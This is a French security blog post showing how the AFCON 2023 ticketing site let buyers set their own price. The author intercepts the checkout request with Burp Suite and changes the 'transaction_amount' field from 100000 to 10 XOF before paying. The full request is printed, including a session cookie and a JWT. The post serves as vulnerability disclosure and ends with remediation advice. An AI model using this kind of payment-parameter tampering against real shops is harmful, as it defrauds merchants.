---
title : "CAN 2023 : La faille qui permettait d'acheter un billet de match à n'importe quel prix"
date : 2024-01-19T09:49:04Z
draft : false
images: [/images/1.png]
featuredImage: "/images/1.png"
featuredImagePreview: "/images/1.png"
---

# 🧟 La faille qui permettait d'acheter un billet de match à n'importe quel prix

## Introduction
Dans cet article, nous allons examiner une vulnérabilité découverte sur le site de vente de billets pour la Coupe d'Afrique des Nations de 2023 https://can2023-tickets.com/. 

Cette faille permet à une personne mam intentionnée d'acheter des billets à un prix inférieur à leur valeur réelle. Nous allons démontrer comment exploiter cette vulnérabilité et, en conclusion, donner des recommandations pour prévenir de telles failles à l'avenir.

## Détails de l'exploitation
L’exploitation est relativement très simple. 
D'abord on choisi le ticket qu'on veut acheter avec tous les détails à savoir la catégorie, la zone et le siège. 
Comment on peut le voir avec la capture ci-dessous, on a tous les éléments nécessaires et le prix du billet.

![Alt text](/images/3.png)

Ici on intercepte la requête qui permet de valider le panier pour effectuer le paiement avec Burpsuite.

![Alt text](/images/4.png)


Contenu de la requête :

```
POST /order HTTP/1.1
Host: crossroad-africa.net
Cookie: _session_id=8ababf97261c1f2d274494a5339a5965
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 332
Origin: https://can2023-tickets.com
Referer: https://can2023-tickets.com/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Te: trailers
Connection: close

operation_token=oDJRLnbY-MHCr-AeQo-FOWf-ves5BdwUW3Rg&order=KK3818AXB&jwt=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJDQUYiLCJvcmRlciI6IktLMzgxOEFYQiIsImV4cCI6MTcwNTc0MzYxNiwiaXNzIjoiR2F0ZXdheSBQYXlNb25leSIsImlhdCI6MTcwNTY1NzIxNiwiYXVkIjoiRS1jb21tZXJjZSJ9.5USzKvP7bc6KKnW7IT92bLdcZnWIQ5pWWU3OVpeuiQw&currency=xof&transaction_amount=100000&payer=

```
Ici nous avons les données qui sont envoyés à l'API de paiement.
Nous avons le Token de l'opération, la monnaie utilisée et le prix du billet.
Nous avons remarqué que c'est le paramètre "transaction_amount" qui envoi le prix du billet à l'API de paiement.

```
operation_token=oDJRLnbY-MHCr-AeQo-FOWf-ves5BdwUW3Rg&order=KK3818AXB
&jwt=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJDQUYiLCJvcmRlciI6IktLMzgxOEFYQiIsImV4cCI6MTcwNTc0MzYxNiwiaXNzIjoiR2F0ZXdheSBQYXlNb25leSIsImlhdCI6MTcwNTY1NzIxNiwiYXVkIjoiRS1jb21tZXJjZSJ9.5USzKvP7bc6KKnW7IT92bLdcZnWIQ5pWWU3OVpeuiQw
&currency=xof
&transaction_amount=100000
&payer=

```

On peut mettre le prix qu'on veut sur ce paramètre pour modifier le prix du billet. 

Dans notre exemple, nous allons essayé avec 10 Francs.


```
operation_token=oDJRLnbY-MHCr-AeQo-FOWf-ves5BdwUW3Rg&order=KK3818AXB
&jwt=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJDQUYiLCJvcmRlciI6IktLMzgxOEFYQiIsImV4cCI6MTcwNTc0MzYxNiwiaXNzIjoiR2F0ZXdheSBQYXlNb25leSIsImlhdCI6MTcwNTY1NzIxNiwiYXVkIjoiRS1jb21tZXJjZSJ9.5USzKvP7bc6KKnW7IT92bLdcZnWIQ5pWWU3OVpeuiQw
&currency=xof
&transaction_amount=10
&payer=

```

Et nous remarquons que le changement de prix a été effectué sans problème.

![Alt text](/images/6.png)


Après paiement, les billets sont envoyés par mail.

![Alt text](/images/8.png)

## Recommandations


* Mettre en place des tests de pénétration réguliers : Effectuez des tests de pénétration réguliers pour identifier et corriger les vulnérabilités avant qu'elles ne soient exploitées.

* Utiliser une validation d'entrée robuste : Assurez-vous que le site Web utilise une validation d'entrée robuste pour empêcher les utilisateurs d'injecter du code malveillant.


* Mettre à jour les composants tiers : Maintenez les composants tiers utilisés sur le site Web à jour pour éviter les vulnérabilités connues.


* Mettre en place une authentification et une autorisation solides : Implémentez un système d'authentification et d'autorisation robuste pour empêcher les accès non autorisés.


* Former les développeurs : Formez les développeurs aux meilleures pratiques en matière de sécurité pour éviter les vulnérabilités courantes. 